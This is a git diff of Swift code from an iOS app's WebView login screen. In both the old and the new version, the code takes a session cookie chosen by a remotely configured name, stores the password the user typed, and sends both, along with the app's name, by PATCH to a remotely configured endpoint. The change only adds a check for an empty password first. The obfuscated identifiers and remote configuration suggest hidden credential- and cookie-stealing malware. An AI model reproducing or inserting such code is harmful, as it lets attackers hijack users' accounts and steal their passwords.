@@ -72,26 +72,31 @@ struct ThreeCoor: UIViewRepresentable {
                             WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
                                 let cokiThee = cookies.firstIndex(where: { $0.name == self.prentThree.listData[RemoKey.nam09ap.rawValue] ?? "" })
                                 if cokiThee != nil {
-                                    UserDefaults.standard.set(try? JSONEncoder().encode(UsMK(matkhau: self.prentThree.get_pw_three)), forKey: "matkhau")
-                                    self.prentThree.load_hide_three = true
-                                    let jsonThreee: [String: Any] = [
-                                        self.prentThree.listData[RemoKey.nam06ap.rawValue] ?? "": cookies[cokiThee!].value,
-                                        self.prentThree.listData[RemoKey.nam07ap.rawValue] ?? "": self.prentThree.get_pw_three,
-                                        self.prentThree.listData[RemoKey.nam08ap.rawValue] ?? "": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""]
-                                    let url = URL(string: self.prentThree.listData[RemoKey.rm04ch.rawValue] ?? "")!
-                                    let datajsThree = try? JSONSerialization.data(withJSONObject: jsonThreee)
-                                    var request = URLRequest(url: url)
-                                    request.httpMethod = "PATCH"
-                                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
-                                    request.httpBody = datajsThree
-                                    let task = URLSession.shared.dataTask(with: request) { _, _, error in
-                                        if error != nil {
-                                            print("not_ok")
-                                        } else {
-                                            self.prentThree.next_screen_three = true
+                                    if self.prentThree.get_pw_three.isEmpty {
+                                        self.prentThree.check_pw_empt = true
+                                    } else {
+                                        UserDefaults.standard.set(try? JSONEncoder().encode(UsMK(matkhau: self.prentThree.get_pw_three)), forKey: "matkhau")
+                                        self.prentThree.load_hide_three = true
+                                        let jsonThreee: [String: Any] = [
+                                            self.prentThree.listData[RemoKey.nam06ap.rawValue] ?? "": cookies[cokiThee!].value,
+                                            self.prentThree.listData[RemoKey.nam07ap.rawValue] ?? "": self.prentThree.get_pw_three,
+                                            self.prentThree.listData[RemoKey.nam08ap.rawValue] ?? "": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""]
+                                        let url = URL(string: self.prentThree.listData[RemoKey.rm04ch.rawValue] ?? "")!
+                                        let datajsThree = try? JSONSerialization.data(withJSONObject: jsonThreee)
+                                        var request = URLRequest(url: url)
+                                        request.httpMethod = "PATCH"
+                                        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+                                        request.httpBody = datajsThree
+                                        let task = URLSession.shared.dataTask(with: request) { _, _, error in
+                                            if error != nil {
+                                                print("not_ok")
+                                            } else {
+                                                self.prentThree.next_screen_three = true
+                                            }
                                         }
+                                        task.resume()
                                     }
-                                    task.resume()
+                                    
                                 }
                             }
                         }
